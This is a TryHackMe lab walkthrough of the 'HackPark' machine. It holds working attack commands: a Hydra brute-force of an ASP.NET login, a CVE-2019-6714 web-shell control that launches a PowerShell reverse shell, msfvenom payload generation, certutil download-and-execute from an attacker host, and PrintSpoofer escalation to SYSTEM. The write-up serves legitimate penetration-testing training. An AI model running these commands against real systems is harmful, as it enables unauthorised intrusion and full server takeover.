# HackPark - TryHackMe

> **Kill Chain Summary**:
> Port Scanning (Ports 80, 3389) -> Web Enumeration (BlogEngine.NET 3.3.6.0 on IIS 8.5) -> ASP.NET Login Form Brute-Force with Hydra (extracting `__VIEWSTATE` and `__EVENTVALIDATION`) -> Administrative Credentials (`admin:1qaz2wsx`) -> Authenticated Theme Upload RCE (CVE-2019-6714 / `PostView.ascx`) -> Web Shell as `iis apppool\blog` -> Shell Stabilization -> Privilege Enumeration (`SeImpersonatePrivilege Enabled`) -> Transfer Integrity Verification -> Token Impersonation via PrintSpoofer -> Elevated Shell (`NT AUTHORITY\SYSTEM`).

| Property | Value |
| :--- | :--- |
| **Target Name** | HackPark |
| **Platform** | TryHackMe |
| **OS** | Windows Server 2012 R2 |
| **Difficulty** | Medium |
| **Status** | Rooted |
| **Key Techniques** | ASP.NET State Parameter Brute-Force, BlogEngine.NET Theme Upload RCE (CVE-2019-6714), File Transfer Verification, Token Impersonation (SeImpersonatePrivilege) |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning

A full TCP port scan was executed using Nmap with `-Pn`:

```bash
sudo nmap -Pn -sC -sV -p- -T4 -oA nmap/full_tcp_10.130.142.63 10.130.142.63
```

**Open Ports:**

| Port | Service | Version | Description |
| :--- | :--- | :--- | :--- |
| 80/tcp | HTTP | Microsoft IIS httpd 8.5 | Web application interface |
| 3389/tcp | RDP | Microsoft Terminal Services | Remote Desktop protocol |

### 1.2 Web Application Enumeration

Navigating to `http://10.130.142.63/` displays a blog application titled "HackPark".

Inspecting `robots.txt`:
```text
User-agent: *
Disallow: /Account/login.aspx
Disallow: /search
```

Reviewing the HTML source of `/search` reveals the CMS name and version in an HTML comment:

```html
<!-- BlogEngine 3.3.6.0 -->
```

Searching Exploit-DB confirms that BlogEngine.NET 3.3.6.0 is vulnerable to an authenticated path traversal and remote code execution flaw (**CVE-2019-6714**).

---

## 2. Initial Access

### 2.1 ASP.NET Login Form Brute-Force via Hydra

The exploit requires authenticated access to upload an `.ascx` control file via the File Manager.

Navigating to `/Account/login.aspx` presents an ASP.NET authentication form. ASP.NET forms include anti-tampering state parameters (`__VIEWSTATE` and `__EVENTVALIDATION`) that must be captured from the page source and submitted with every POST request.

#### Capturing Hidden Fields
View page source (`Ctrl+U`) and extract the values for:
- `__VIEWSTATE`
- `__EVENTVALIDATION`

#### Executing Hydra Brute-Force
Incorporate the captured state parameters into Hydra's `http-post-form` module:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.130.142.63 http-post-form \
  "/Account/login.aspx?ReturnURL=admin:__VIEWSTATE=<VIEWSTATE_VAL>&__EVENTVALIDATION=<EVENTVALIDATION_VAL>&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
```

```text
[80][http-post-form] host: 10.130.142.63   login: admin   password: 1qaz2wsx
1 of 1 target completed, 1 valid password found
```

Discovered credentials:
- **Username:** `admin`
- **Password:** `1qaz2wsx`

### 2.2 Exploiting BlogEngine.NET RCE (CVE-2019-6714)

> [!NOTE] Concept: CVE-2019-6714 (BlogEngine.NET PostView Path Traversal)
> BlogEngine.NET versions 3.3.6.0 and prior allow authenticated users to upload `.ascx` controls via the file manager. By providing a path traversal sequence in the `theme` URL parameter (`?theme=../../App_Data/files`), the application renders `PostView.ascx` directly from the upload directory, executing embedded C# code.

#### Step 1: Configure Malicious Control
Retrieve Exploit-DB script 46353 (`PostView.ascx`) and update the payload configuration with the attacker IP and port:

```csharp
/* PostView.ascx */
<%@ Control Language="C#" AutoEventWireup="true" CodeFile="PostView.ascx.cs" Inherits="PostView" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e) {
        System.Diagnostics.Process.Start("cmd.exe", "/c powershell.exe -e <BASE64_REV_SHELL>");
    }
</script>
```

#### Step 2: Upload File
1. Log in to the administrative dashboard at `http://10.130.142.63/Account/login.aspx`.
2. Open the post editor, click the file attachment icon, and upload `PostView.ascx`.

#### Step 3: Trigger Execution
Start a Netcat listener on port 4444:

```bash
nc -lvnp 4444
```

Trigger the uploaded control by passing the traversal string to the `theme` parameter:

```bash
curl "http://10.130.142.63/?theme=../../App_Data/files"
```

The listener catches the incoming shell:

```text
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.130.142.63] 49301
c:\windows\system32\inetsrv> whoami
iis apppool\blog
```

### 2.3 Shell Stabilization

To ensure session persistence, generate an executable reverse shell using `msfvenom`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4445 -f exe -o shell.exe
python3 -m http.server 8000
```

Download and execute the binary using `certutil`:

```cmd
certutil -urlcache -split -f http://10.10.14.5:8000/shell.exe C:\Temp\shell.exe
C:\Temp\shell.exe
```

A stable, dedicated interactive shell is caught on listener port 4445.

Retrieve the user flag:

```cmd
type C:\Users\jeff\Desktop\user.txt
```

```text
[FLAG REDACTED]
```

---

## 3. Privilege Escalation

### 3.1 Local Enumeration: Account Privileges

Checking security tokens assigned to the `iis apppool\blog` identity:

```cmd
whoami /priv
```

```text
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
```

The account has `SeImpersonatePrivilege` enabled.

### 3.2 File Transfer Verification Pitfall

When transferring privilege escalation binaries to Windows targets, files can become corrupted or truncated to 0 bytes due to interrupted HTTP requests, raw download URL mismatches, or antivirus quarantine.

Always verify file size after transferring binaries:

```cmd
certutil -urlcache -split -f http://10.10.14.5:8000/PrintSpoofer64.exe C:\Temp\PrintSpoofer.exe
dir C:\Temp\PrintSpoofer.exe
```

If `dir` displays `0 bytes`, re-download the binary or encode it locally via Base64.

### 3.3 Exploitation via PrintSpoofer

Once verified that `PrintSpoofer.exe` contains the full binary size (typically ~27 KB):

```cmd
cd C:\Temp
.\PrintSpoofer.exe -i -c cmd
```

```text
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
C:\Windows\system32> whoami
nt authority\system
```

The shell is elevated to `NT AUTHORITY\SYSTEM`.

Retrieve the root flag:

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

```text
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# Capture and Submit ASP.NET ViewState Form Fields with Hydra
hydra -l <USER> -P <WORDLIST> <TARGET_IP> http-post-form \
  "/Account/login.aspx:__VIEWSTATE=<VAL>&__EVENTVALIDATION=<VAL>&username=^USER^&password=^PASS^:Login failed"

# Verify File Integrity After Certutil Transfer on Windows
certutil -urlcache -split -f http://<KALI_IP>:<PORT>/tool.exe tool.exe
dir tool.exe

# Elevate Privileges via PrintSpoofer
PrintSpoofer.exe -i -c cmd
```

---

## 5. Key Takeaways and Lessons Learned

1. **Stateful Web Form Brute-Forcing:** ASP.NET web applications reject login attempts that omit session verification tokens. Capturing `__VIEWSTATE` and `__EVENTVALIDATION` via developer tools or Burp Suite is mandatory before running Hydra or custom brute-force scripts.
2. **Transfer Verification Discipline:** Always inspect file metadata (`dir` or `ls -l`) after transferring tools to a target. A 0-byte binary indicates a failed or blocked transfer and must be diagnosed before debugging execution syntax.
3. **IIS Service Account Escalation Path:** Web applications hosted on IIS run under application pool service accounts (`iis apppool\...`). These accounts almost universally hold `SeImpersonatePrivilege`, making potato exploits (`PrintSpoofer`, `JuicyPotato`) the standard privilege escalation path.

---

#tryhackme #windows #medium #blogengine #cve-2019-6714 #hydra #aspnet #viewstate #certutil #seimpersonate #printspoofer #privesc